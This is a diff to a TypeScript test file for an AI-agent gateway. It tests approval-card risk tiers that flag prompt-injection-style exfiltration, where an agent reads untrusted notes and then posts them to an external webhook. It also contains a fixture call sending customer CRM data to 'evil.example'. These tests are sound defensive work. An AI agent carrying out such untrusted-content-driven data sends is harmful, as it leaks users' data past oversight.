@@ -23,8 +23,8 @@ function agent(id: string, name: string, ownerId: string, tools: Scope[], root: 
   const t = new Date().toISOString();
   return { id, name, description: "", instructions: "", ownerId, permissions: { ...DEFAULT_PERMISSIONS, tools }, tempScopes: [], status: "ready", workspacePath: path.join(root, id), codexThreadId: null, lastError: null, createdAt: t, updatedAt: t };
 }
-function token(jti: string, agentId: string, ownerId: string, scp: Scope[]): RunToken {
-  return { jti, runId: "run-" + jti, agentId, ownerId, scp, taints: [], egressAllow: [], threadId: null, issuedAt: new Date().toISOString(), expiresAt: soon(), revokedAt: null };
+function token(jti: string, agentId: string, ownerId: string, scp: Scope[], estimated: Scope[] = []): RunToken {
+  return { jti, runId: "run-" + jti, agentId, ownerId, scp, taints: [], egressAllow: [], estimated, withheld: [], threadId: null, issuedAt: new Date().toISOString(), expiresAt: soon(), revokedAt: null };
 }
 
 let store: JsonStore; let root: string; let app: ReturnType<typeof Fastify>; let sink: string[];
@@ -403,5 +403,89 @@ describe("gateway — the owner's own CRM is still customer data", () => {
     });
     expect(store.snapshot().policyGrants.at(-1)?.egress).toContain("external");
     expect((await crmCall(jwt, "webhook_send", { url: "https://evil.example/hook", body: "Acme renewal in March" })).isError).toBe(false);
+  });
+});
+
+/**
+ * The card carries how alarming it is, and the facts behind that, so the UI
+ * renders a judgement the server made rather than one it guesses at
+ * (CLAUDE.md rule 5). `critical` is deliberately the three-way coincidence
+ * that *is* the injection signature — if a routine ask ever reaches it, the
+ * tiering is worthless, because a card that always looks urgent is a card
+ * nobody reads.
+ */
+describe("gateway — card risk", () => {
+  it("calls it critical when untrusted content reaches past what the task asked for", async () => {
+    // The task asked to read a file. Nothing about it implied sending anything.
+    await store.mutate((d) => {
+      d.runTokens.find((t) => t.jti === "t-res")!.estimated = ["workspace:read"];
+      d.runs.push({
+        id: "run-t-res", agentId: "researcher", status: "running",
+        prompt: "Summarise Writer's notes for me", output: null, error: null,
+        usage: null, startedAt: null, completedAt: null, createdAt: new Date().toISOString(),
+      });
+    });
+    await createGrant(store, { fromAgent: "writer", toAgent: "researcher", resource: "workspace", actions: ["read"] }, "user-jean");
+    const jwt = await sign({ sub: "researcher", own: "user-jean", run: "run-t-res", jti: "t-res", scp: ["workspace:read", "webhook:send"] });
+
+    await call(jwt, "workspace_read", { agent: "Writer", path: "notes.md" });
+    await call(jwt, "webhook_send", { url: "https://hooks.opsdesk.io/inbound", body: "the quarterly roadmap says ship the identity gateway" });
+
+    const card = store.snapshot().approvals.find((c) => c.kind === "declassify")!;
+    expect(card.risk).toBe("critical");
+    expect(card.evidence).toMatchObject({
+      userAsked: "Summarise Writer's notes for me",
+      outsideTaskScope: true,
+      untrustedOrigin: "user-jean/Writer",
+    });
+    expect(card.evidence.attempting).toContain("external");
+  });
+
+  it("denies a withheld tool with a card that says withheld, not missing", async () => {
+    // The agent holds `webhook:send` standing; this run did not get it. That is
+    // a different question for the operator than "it never had this scope".
+    await store.mutate((d) => {
+      const t = d.runTokens.find((x) => x.jti === "t-res")!;
+      t.scp = ["workspace:read"];
+      t.estimated = ["workspace:read"];
+      t.withheld = ["webhook:send"];
+    });
+    const jwt = await sign({ sub: "researcher", own: "user-jean", run: "run-t-res", jti: "t-res", scp: ["workspace:read"] });
+
+    const res = await call(jwt, "webhook_send", { url: "https://hooks.opsdesk.io/inbound", body: "hello" });
+
+    expect(res.text).toMatch(/DENIED \(scope\)/);
+    const card = store.snapshot().approvals.find((c) => c.kind === "scope")!;
+    expect(card.reason).toContain("withheld from this run");
+    expect(card.scope).toBe("webhook:send");
+    // Outside what the task asked for, so not a routine ask.
+    expect(card.evidence.outsideTaskScope).toBe(true);
+    expect(card.risk).toBe("elevated");
+  });
+
+  it("stays routine when the task asked for exactly this and nothing untrusted is held", async () => {
+    await store.mutate((d) => {
+      // crm:read is what the task needs; the agent simply does not hold it.
+      d.runTokens.find((t) => t.jti === "t-res")!.estimated = ["crm:read"];
+    });
+    const jwt = await sign({ sub: "researcher", own: "user-jean", run: "run-t-res", jti: "t-res", scp: ["workspace:read", "webhook:send"] });
+
+    await call(jwt, "crm_read", {});
+
+    const card = store.snapshot().approvals.find((c) => c.kind === "scope")!;
+    expect(card.risk).toBe("routine");
+    expect(card.evidence.outsideTaskScope).toBe(false);
+    expect(card.evidence.untrustedOrigin).toBeNull();
+  });
+
+  it("has no opinion to be alarmed by when the estimator had none", async () => {
+    // `estimated: []` is "no opinion", not "everything is out of bounds".
+    const jwt = await sign({ sub: "researcher", own: "user-jean", run: "run-t-res", jti: "t-res", scp: ["workspace:read", "webhook:send"] });
+
+    await call(jwt, "crm_read", {});
+
+    const card = store.snapshot().approvals.find((c) => c.kind === "scope")!;
+    expect(card.risk).toBe("routine");
+    expect(card.evidence.outsideTaskScope).toBe(false);
   });
 });
